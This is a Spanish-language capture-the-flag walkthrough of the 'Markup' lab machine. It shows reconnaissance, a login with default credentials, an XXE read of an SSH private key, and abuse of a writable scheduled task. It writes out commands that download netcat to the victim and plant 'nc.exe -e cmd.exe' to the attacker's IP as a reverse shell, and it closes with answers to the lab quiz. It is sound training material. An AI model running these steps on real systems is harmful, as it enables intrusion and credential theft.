# Markup

### 1. 📝 **Introducción**

* **Nivel de Dificultad**: Muy fácil.
* **Tags:**&#x20;
  * **Reconnaissance (Reconocimiento):** Fase crucial en el proceso de pruebas de penetración, donde se recopila información detallada sobre el objetivo. Este proceso incluye el escaneo de puertos, el análisis de los servicios disponibles, la identificación de vulnerabilidades y la recopilación de datos sobre las configuraciones del sistema. Permite a los atacantes descubrir posibles vectores de entrada.
  * **Apache**: Servidor web que puede ser explotado si no se aplica la configuración adecuada o si no se actualizan sus módulos y componentes.
  * **SSH**: Protocolo seguro para acceder de manera remota a servidores, pero con configuraciones débiles (como claves predeterminadas o contraseñas débiles) puede ser una puerta de entrada.
  * **PHP**: Lenguaje de programación común en aplicaciones web; si no se configura de manera segura, puede ser vulnerable a inyecciones y otros ataques.
  * **Scheduled Job Abuse**: Los trabajos programados mal configurados o sin restricción de privilegios pueden ser explotados para ejecutar comandos maliciosos o obtener acceso a recursos restringidos.
  * **Arbitrary File Upload**: Vulnerabilidad en la que los atacantes cargan archivos maliciosos, como shells PHP, para ejecutar código en el servidor y obtener acceso no autorizado.
  * **XXE Injection**: Ataque de inyección de XML External Entity (XXE) que explota la capacidad de procesamiento de XML para acceder a archivos locales o realizar otros ataques como el denegado de servicio.
  * **Weak Permissions**: Permisos mal configurados en el sistema de archivos pueden permitir a usuarios no autorizados acceder o modificar archivos sensibles, facilitando la escalada de privilegios o la exfiltración de datos.

### 2. 🛠️ **Entorno**

Nos descargamos nuestra VPN y nos conectamos.

```
sudo openvpn nombre_del_archivo.vpn
```

Iniciamos la máquina y verificamos la conexión.

```bash
ping -c 1 10.129.95.192
```

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Observamos que tenemos conexión y que es una máquina **Windows** ya que su **ttl=127**.

### 3. 🔍 **Reconocimiento**

A continuación, se realiza el comando:

```bash
nmap -sCV -Pn 10.129.95.192
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 4. 🚪 **Acceso Inicial**

Como podemos observar durante el escaneo, los puertos **80** (**HTTP**), **22** (**SSH**) y **443** (**HTTPS**) están abiertos. A continuación, se indagará más sobre estos servicios.

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Nos logueamos con las credenciales por defecto **admin**:**password**.

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Vamos al apartado de **Order** e interceptamos las peticiones. Podemos observar que hay un XML External Entity.

{% embed url="https://book.hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html#main-attacks" %}

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Vamos a leer la clave privada de SSH del usuario.

<figure><img src="../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Nos la copiamos y le damos permisos para loguearnos.

```bash
chmod 600 id_rsa
ssh -i id_rsa daniel@10.129.95.192
```

<figure><img src="../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Buscamos lo que nos preguntan.

<figure><img src="../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

En este escenario, **job.bat** es un archivo utilizado para programar una tarea en Windows, que ejecuta el comando **wevtutil.exe** para registrar eventos. Este archivo es ejecutado de manera regular como parte de una tarea programada.

El objetivo es actualizar este proceso de **job.bat** de un script de shell simple a un script de PowerShell y verificar los procesos en ejecución con el comando `ps` en PowerShell.

```bash
icacls job.bat
```

<figure><img src="../../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Al observar que el `(F)` junto a **Users** en los permisos significa que **todos los usuarios** pueden modificar el archivo **job.bat**, se puede explotar esto para agregar un comando de **netcat** en el archivo. De esta forma, cada vez que la tarea programada se ejecute, la máquina víctima se conectará de vuelta a la máquina atacante.

En nuestra máquina atacante.

```bash
wget https://github.com/vinsworldcom/NetCat64/releases/tag/1.11.6.4/nc64.exe
python3 -m http.server
```

En la máquina víctima.

```bash
curl -o nc.exe http://10.10.16.35:8000/nc.exe
```

<figure><img src="../../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ejecutamos para generar una Reverse Shell.

```bash
echo C:\Log-Management\nc.exe -e cmd.exe 10.10.16.35 1234 > C:\Log-Management\job.bat
```

Nos ponemos en escucha y recibimos la conexión.

### 5. 🔑 **Captura de la Flag**

<figure><img src="../../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 6. ❓Preguntas

#### **Tarea 1**

**¿Qué versión de Apache está corriendo en el puerto 80 del objetivo?**\
**Respuesta:** 2.4.41

#### **Tarea 2**

**¿Qué combinación de nombre de usuario:contraseña inicia sesión con éxito?**\
**Respuesta:** admin:password

#### **Tarea 3**

**¿Cuál es la palabra en la parte superior de la página que acepta la entrada del usuario?**\
**Respuesta:** order

#### **Tarea 4**

**¿Qué versión de XML se utiliza en el objetivo?**\
**Respuesta:** 1.0

#### **Tarea 5**

**¿Qué significa el acrónimo XXE / XEE?**\
**Respuesta:** XML External Entity

#### **Tarea 6**

**¿Qué nombre de usuario podemos encontrar en el código HTML de la página web?**\
**Respuesta:** Daniel

#### **Tarea 7**

**¿Qué archivo se encuentra en la carpeta Log-Management en el objetivo?**\
**Respuesta:** job.bat

#### **Tarea 8**

**¿Qué ejecutable se menciona en el archivo mencionado antes?**\
**Respuesta:** wevtutil.exe
